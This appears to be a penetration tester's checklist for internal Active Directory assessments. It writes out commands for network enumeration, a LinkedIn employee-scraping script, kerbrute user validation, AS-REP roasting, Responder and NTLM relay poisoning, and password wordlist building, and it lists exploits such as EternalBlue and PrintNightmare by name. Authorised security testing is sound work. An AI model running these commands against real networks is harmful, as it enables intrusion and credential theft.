# Internal Pentesting Checklist
## Uncredentialed
### Pre-Assessment
- [ ] User Identification: LinkedIn Scrape, Dehashed, OSINT
- [ ] Wordlist Building: Scrape websites, popular sports teams in the area, industry related words from the area. (If a zoo, popular zoo names, if a school, team names)
### Network Enumeration
- [ ] NMAP Ping scan for living hosts:
```nmap -sP -iL <IP FILE> -oA NmapLiveHosts.txt ```
- [ ] NMAP live host scanning:
```nmap -A -p- -iL NmapLiveHosts.txt  >> NmapHostsSummary.txt ```
- [ ] NMAP PCI Testing:
``` nmap -Pn -T5 -p 1-65535 -vv -iL IP.txt -oA output.txt ```
- [ ] Domain Discovery: Use CME to find the DC,
``` Crackmapexec smb X.X.X.X/24 -u '' -p '' ```
- [ ] Find the DC:
``` nslookup domain name ```
- [ ] Test for Null Domain Enumeration:
``` enum4linux X.X.X.X -A ```
- [ ] Test for ldap bind:
``` impacket-getadusers -all test.local/username:password -dc-ip X.X.X.X ```
- [ ] Screenshot any webpages in the network:
``` eyewitness --web -f <nmap IP file> ```
- [ ] DNS Footprinting:
``` nslookup -type=<recordtype> <target domain> ```
- [ ] DNS Zone Transfer:
``` dig axfr  <Domain_name> @name_server ```
- [ ] Obligatory SSL checks:
``` sslscan X.X.X.X ```

### User Identification, Test for default usernames or typical names
The goal is to build a comprehensive userlist and validate them against the AD using kerbrute.
- [ ] User Identification: LinkedIn Scrape, Dehashed, OSINT
      ``` # Inspect Web Page > Console > Under People**
      
      const profileTitles = document.querySelectorAll('.org-people-profile-card__profile-title');
          let textList = '';
          for (let i = 0; i < profileTitles.length; i++) {
          if (profileTitles[i].innerText === "LinkedIn Member") {
             continue;
          }
          textList += profileTitles[i].innerText + '\n';
          }
          console.log(textList);
      **# Use this in terminal for the file**
        awk '{split($1, first, ""); last = $2; gsub(" ", "", last); print toupper(first[1]) tolower(last)}' your_file.txt
      ```
- [ ] SMB User Enumeration
     ```#Various methods**
        crackmapexec smb X.X.X.X/24 --users
        nmap -p88 --script krb5-enum-users --script args="krb5-enum-users.realm''DOMAIN' .userdb=USERLIST X.X.X.X
        enum4linunx -U X.X.X.X
        impacket-lookupsid Domain/guest@x.x.x.x
        smbclient -U domain/admin \\\\X.X.X.X\\IPC$   ```
    
- [ ] Printers Enumeration Users
   ** #Find printers in the network and see if they have admin open or default creds**
      use the address book to add users to your list
- [ ] Default Credentials
      https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
      https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv
- [ ] Get AD User List
      ```
      GetADUsers.py DC.local/ -dc-ip 10.10.10.10 -debug
      # Capture Passwords
        awk -F: '{print $1}' your_file.txt
        awk -F: '{print $3}' your_file.txt
        Get Rid of Email portion
        awk -F'\\' '{print $2}'
       ```

### Password Attacks
- [ ] Kerbrute ```kerbrute userenum -d DOMAIN.com --dc X.X.X.X username.txt -o validUsers ```
- [ ] ASREP: see if any users had pre-authentication disabled
    ``` # Get hashes with no krb preauth, (add domain to your hosts file)
cme ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
GetNPUsers.py 'DC.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.10
Hashcat module  18200
    ```
- [ ] CUPP can be used to build password possibilities
 Common User passwords profiler, need to know the password policy to be successful at this.
		automatic and interactive tool written in python for creating custom wordlists
		used to build passwords based oof well known details about the target THIS MEANS OSINT is needed
		This also has L33t mode which allows for someone to replace a,e,i,o,u with numbers.
	Running CUPP
		Install from git clone https:.//github.com/Mebus/cupp.git then run CMD: python3 cupp.py
		you can also include default creds from the alecto database using -a
### Poisoning
- [ ] NMAP to find hosts with SMB signing not enforced
       ```
      nmap -p 445 --script=smb2-security-mode X.X.X.X
      nmap -p 139--script=smb2-security-mode X.X.X.X
       ```
- [ ] Responder
      ``` # Responder
      responder -wrfvPd â€“I eth0
      
      # Relay
      impacket-Ntlmrelayx.py -tf targets.txt -smb2support --output-file ResponderHashes.txt
      Nc 127.0.0.1 11000 
      impacket-Ntlmrelayx.py --add-computer
      
      # Dont forget
      Hashes will be saved into a file so you will want to read the file to get user hashes
       ```
- [ ] MITM6

### AD Enumeration
#### Quick Wins 
- [ ] Run Bloodhoun
- [ ] NoPAC
- [ ] GPP Password
- [ ] ASREP Roasting: Impacket, CME

### Get AD Information
- [ ] Password in AD User Description
- [ ] Get All AD Users with impacket-getadusers
- [ ] Pull groups, domain trusts, password policy with CME, review with bloodhound

### File Hunting
- [ ] Use manspider to hunt for sensitive files
- [ ] Snaffler is another good tool
- [ ] CME spider module

### URL File Attack
- [ ] Locate File Shares: You need write access
- [ ] Place a URL file attack and run responder to capture user hashes. Relay or crack them.

- [ ] Pingcastle
- [ ] Zerologon: DONT EXPLOIT THIS, just validate

- [ ] Unconstrained Delegation
- [ ] Resource Based Constrained Delegation

- [ ] Forged Certificates

### Protocol Attacks
- [ ] SMB attacks: enumerate, vuln scan with NMAP
- [ ] LDAP: nmap
- [ ] SNMP UDP 161
- [ ] MySQL 1433: Attempt to login with windows auth then xp_command or relay attack

### Elevated Access (Local admin)

- [ ] Nanodump
- [ ] EternalBlue/Champion/Romance
- [ ] Printnightmare
- [ ] PrivExchange
- [ ] SMBBleed
